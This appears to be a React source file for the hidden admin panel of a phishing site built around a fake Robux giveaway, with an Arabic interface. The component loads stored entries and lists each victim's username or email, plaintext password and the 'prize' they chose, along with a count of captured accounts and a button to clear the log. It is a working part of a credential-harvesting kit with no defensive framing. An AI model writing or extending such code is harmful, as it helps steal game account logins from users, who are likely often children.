
import React, { useState, useEffect } from 'react';
import { UserCredential } from '../types';

interface AdminViewProps {
  onBack: () => void;
}

const AdminView: React.FC<AdminViewProps> = ({ onBack }) => {
  const [data, setData] = useState<UserCredential[]>([]);

  useEffect(() => {
    const saved = localStorage.getItem('robux_data');
    if (saved) {
      setData(JSON.parse(saved));
    }
  }, []);

  const clearData = () => {
    if (confirm('هل أنت متأكد من مسح جميع البيانات؟')) {
      localStorage.removeItem('robux_data');
      setData([]);
    }
  };

  return (
    <div className="animate-fadeIn space-y-6">
      <div className="flex justify-between items-center">
        <button 
          onClick={onBack}
          className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-lg transition-colors flex items-center gap-2"
        >
          <i className="fa-solid fa-arrow-right"></i>
          العودة للموقع
        </button>
        <h2 className="text-2xl font-bold text-white flex items-center gap-3">
          <i className="fa-solid fa-user-shield text-red-500"></i>
          لوحة تحكم المشرف (Secret View)
        </h2>
        <button 
          onClick={clearData}
          className="px-4 py-2 bg-red-600/20 hover:bg-red-600/40 text-red-400 rounded-lg transition-colors border border-red-500/30"
        >
          مسح السجلات
        </button>
      </div>

      <div className="custom-glass rounded-2xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-right">
            <thead>
              <tr className="bg-white/5 text-white/50 text-sm uppercase">
                <th className="px-6 py-4 font-medium">اسم المستخدم / البريد</th>
                <th className="px-6 py-4 font-medium">كلمة السر</th>
                <th className="px-6 py-4 font-medium">نوع الجائزة</th>
                <th className="px-6 py-4 font-medium">التاريخ</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {data.length > 0 ? (
                data.map((item) => (
                  <tr key={item.id} className="text-white hover:bg-white/5 transition-colors">
                    <td className="px-6 py-4 font-mono">{item.username}</td>
                    <td className="px-6 py-4 font-mono text-yellow-400">{item.password}</td>
                    <td className="px-6 py-4">
                      <span className="px-3 py-1 bg-blue-600/20 text-blue-400 rounded-full text-xs">
                        {item.prizeType}
                      </span>
                    </td>
                    <td className="px-6 py-4 text-white/40 text-sm">{item.timestamp}</td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={4} className="px-6 py-12 text-center text-white/30 italic">
                    لا توجد بيانات مسجلة حالياً
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="custom-glass p-6 rounded-2xl text-center">
          <div className="text-white/50 text-sm mb-1">إجمالي الحسابات</div>
          <div className="text-3xl font-bold text-white">{data.length}</div>
        </div>
        <div className="custom-glass p-6 rounded-2xl text-center">
          <div className="text-white/50 text-sm mb-1">نشط الآن</div>
          <div className="text-3xl font-bold text-green-400">1</div>
        </div>
        <div className="custom-glass p-6 rounded-2xl text-center">
          <div className="text-white/50 text-sm mb-1">حالة السيرفر</div>
          <div className="text-3xl font-bold text-blue-400">متصل</div>
        </div>
      </div>
    </div>
  );
};

export default AdminView;
